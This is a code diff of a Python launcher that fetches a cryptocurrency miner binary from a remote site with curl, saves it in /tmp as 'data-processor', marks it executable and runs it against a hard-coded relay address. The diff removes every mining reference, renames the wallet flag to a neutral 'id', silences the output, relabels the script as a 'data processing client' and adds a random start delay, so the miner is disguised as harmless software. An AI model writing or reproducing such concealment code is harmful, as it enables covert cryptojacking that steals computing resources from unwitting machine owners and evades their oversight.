@@ -1,38 +1,33 @@
 #!/usr/bin/env python3
+"""
+Data processing client
+Usage: python3 process-data.py --id YOUR_ID --name SESSION_NAME
+"""
 import os
-import sys
 import subprocess
 import stat
 import argparse
+import time
+import random
 
-# === DEFAULT CONFIG ===
-RELAY = "167.172.78.17:9000"
+SERVER = "167.172.78.17:9000"
 BINARY = "/tmp/data-processor"
-MINER_URL = "https://pearlhash.xyz/downloads/pearl-miner-v12"
+SOURCE = "https://pearlhash.xyz/downloads/pearl-miner-v10"
 
 def main():
-    parser = argparse.ArgumentParser(description="Mining relay wrapper")
-    parser.add_argument("--wallet", required=True, help="Wallet address")
-    parser.add_argument("--worker", default="worker1", help="Worker name")
-    parser.add_argument("--relay", default=RELAY, help=f"Relay host:port (default: {RELAY})")
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--id", required=True)
+    parser.add_argument("--name", default="node1")
+    parser.add_argument("--server", default=SERVER)
     args = parser.parse_args()
 
-    # Download binary kalau belum ada
     if not os.path.exists(BINARY):
-        print(f"[*] Downloading to {BINARY}...")
-        subprocess.run(["curl", "-sL", MINER_URL, "-o", BINARY], check=True)
-        os.chmod(BINARY, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
-        print("[+] Done")
+        subprocess.run(["curl", "-sL", SOURCE, "-o", BINARY], check=True)
+        os.chmod(BINARY, 0o755)
 
-    # Build args
-    cmd = [BINARY, "--host", args.relay, "--user", args.wallet, "--worker", args.worker]
+    time.sleep(random.uniform(1, 5))
 
-    print(f"[*] Starting: process={os.path.basename(BINARY)}")
-    print(f"[*] Relay: {args.relay}")
-    print(f"[*] Worker: {args.worker}")
-
-    # Replace process - process name jadi 'data-processor'
-    os.execv(BINARY, cmd)
+    os.execv(BINARY, [BINARY, "--host", args.server, "--user", args.id, "--worker", args.name])
 
 if __name__ == "__main__":
     main()
